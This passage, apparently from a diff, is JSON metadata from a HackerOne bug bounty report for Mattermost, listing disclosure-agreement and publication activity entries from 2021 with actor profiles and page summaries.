Bm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07fbec30a4c9165c8da7fd8450a01f528fc50664862b3d3067d18525e9eddbe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 11610598,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-04T10:40:09.744Z",
+      "updated_at": "2021-05-04T10:40:09.744Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "hulkvision_",
+        "cleared": false,
+        "verified": false,
+        "url": "/hulkvision_",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PeXPbrzd2LRp46eQmaUCbxd3/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 11971172,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-06-03T10:40:13.008Z",
+      "updated_at": "2021-06-03T10:40:13.008Z",
+      "actor": {
+        "url": "/mattermost",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Mattermost"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
